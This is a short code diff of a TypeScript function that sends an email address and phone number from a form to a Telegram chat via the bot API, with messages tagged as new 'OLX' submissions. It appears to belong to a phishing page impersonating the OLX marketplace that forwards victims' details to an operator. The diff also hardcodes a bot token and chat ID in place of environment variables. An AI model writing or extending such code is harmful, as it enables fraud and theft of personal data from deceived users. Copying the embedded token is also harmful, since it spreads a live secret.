@@ -1,15 +1,10 @@
-// Telegram API utility for sending form data
+const TELEGRAM_BOT_TOKEN = '8464545234:AAHE9DsHwZ_9DEM5bMeQNd4r54YhPDBIz9g';
+const TELEGRAM_CHAT_ID = '-1002904177569';
+
 export async function sendToTelegram(formData: { email: string; phone: string }) {
-  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
-  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;
-
-  if (!botToken || !chatId) {
-    throw new Error('Brak konfiguracji Telegram. Sprawdź zmienne środowiskowe.');
-  }
-
   const message = `🆕 Nowe zgłoszenie OLX\n\n📧 Email: ${formData.email}\n📱 Telefon: ${formData.phone}\n\n⏰ Data: ${new Date().toLocaleString('pl-PL')}`;
 
-  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
   const response = await fetch(telegramUrl, {
     method: 'POST',
@@ -17,7 +12,7 @@ export async function sendToTelegram(formData: { email: string; phone: string })
       'Content-Type': 'application/json',
     },
     body: JSON.stringify({
-      chat_id: chatId,
+      chat_id: TELEGRAM_CHAT_ID,
       text: message,
     }),
   });
